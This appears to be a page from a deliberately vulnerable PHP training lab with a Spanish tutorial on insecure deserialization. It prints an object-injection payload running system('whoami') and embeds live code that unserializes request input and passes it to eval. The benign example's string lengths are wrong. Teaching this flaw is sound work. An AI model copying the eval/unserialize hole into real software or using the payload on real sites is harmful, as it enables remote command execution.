<?php include("../../header.php"); ?>

<title>Deserializacion Insegura</title>

<section id="template">
      <div class="container">
        <div class="row">
          <div class="col-md-12">
            <h3 class="title text-center">Deserializacion Insegura</h3>
            <div class="titleHR"><span></span></div>
          </div>
        </div>

        <p>La vulnerabilidad de deserializacion insegura ocurre cuando se utilizan datos que no son deconfianza para abusar de la logica de una aplicacion, aqui el claro ejemplo seria la deserializacion de datos de PHP</p>

        <p>La serializacion seria la contraparte de deserializacion en la cual se forma una cadena de datos la cual gracias al deserializador se restauraran y tomara los datos necesarios o la ejecucion que deba ocurrir segun lo que iba serializado en la cadena</p>

        <p>El problema radica en confiar que un usuario pueda ingresar datos que no danen esa logica, o que puedan ser editados al ser enviados para lograr ejecutar otra accion que no deberia. Inyectando una carga util en el codigo que es serializado para obtener leer un archivo o la ejecucion de comandos dentro del servidor web</p>

        <p>El ejemplo de descifrar php es el siguiente:</p>

        <pre>&lt;&quest;php &NewLine;    class PHPObjectInjection&lcub;&NewLine;        public &dollar;inject&semi;&NewLine;        function &lowbar;&lowbar;construct&lpar;&rpar;&lcub;&NewLine;        &rcub;&NewLine;        function &lowbar;&lowbar;wakeup&lpar;&rpar;&lcub;&NewLine;            if&lpar;isset&lpar;&dollar;this-&gt;inject&rpar;&rpar;&lcub;&NewLine;                eval&lpar;&dollar;this-&gt;inject&rpar;&semi;&NewLine;            &rcub;&NewLine;        &rcub;&NewLine;    &rcub;&NewLine;    if&lpar;isset&lpar;&dollar;&lowbar;REQUEST&lsqb;&apos;datos&apos;&rsqb;&rpar;&rpar;&lcub;  &NewLine;        &dollar;var1&equals;unserialize&lpar;&dollar;&lowbar;REQUEST&lsqb;&apos;datos&apos;&rsqb;&rpar;&semi;&NewLine;        if&lpar;is&lowbar;array&lpar;&dollar;var1&rpar;&rpar;&lcub;&NewLine;            echo &quot;&lt;br&sol;&gt;&quot;&period;&dollar;var1&lsqb;0&rsqb;&period;&quot; - &quot;&period;&dollar;var1&lsqb;1&rsqb;&semi;&NewLine;        &rcub;&NewLine;    &rcub;&NewLine;    else&lcub;&NewLine;        echo &quot;Ingrese una peticion get en el valor &apos;datos&apos;&quot;&semi; &num; nothing happens here&NewLine;    &rcub;&NewLine;&quest;&gt;</pre>

        <p>Lo que aqui se muestra es la ejecucion de la funcion unserialize que hace descifrar los datos serializados, estos pueden venir desde un formulario u otra forma pero la idea es notar que el sistema recibe estos datos y luego muestra una salida de estos. El ejemplo que podria recibir seria:</p>

        <pre>a&colon;2&colon;&lcub;i&colon;0&semi;s&colon;4&colon;&quot;APP&quot;&semi;i&colon;1&semi;s&colon;33&colon;&quot;Aplicacion Vulnerable&quot;&semi;&rcub;</pre>

        <p>Ahora con todo esto y sabiendo un atacante que espera objetos serializados podria aprovecharse de ejecutar comandos en la aplicacion, todo con este objeto serializado:</p>

        <pre>string&lpar;68&rpar; &quot;O&colon;18&colon;&quot;PHPObjectInjection&quot;&colon;1&colon;&lcub;s&colon;6&colon;&quot;inject&quot;&semi;s&colon;17&colon;&quot;system&lpar;&apos;whoami&apos;&rpar;&semi;&quot;&semi;&rcub;&quot;</pre>

<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
    if(isset($_REQUEST['datos'])){  
        $var1=unserialize($_REQUEST['datos']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo "Ingrese una peticion get en el valor 'datos'"; # nothing happens here
    }
?>


    </div> <!--/.container -->
    </section> 
    

<?php include("../../footer.php"); ?>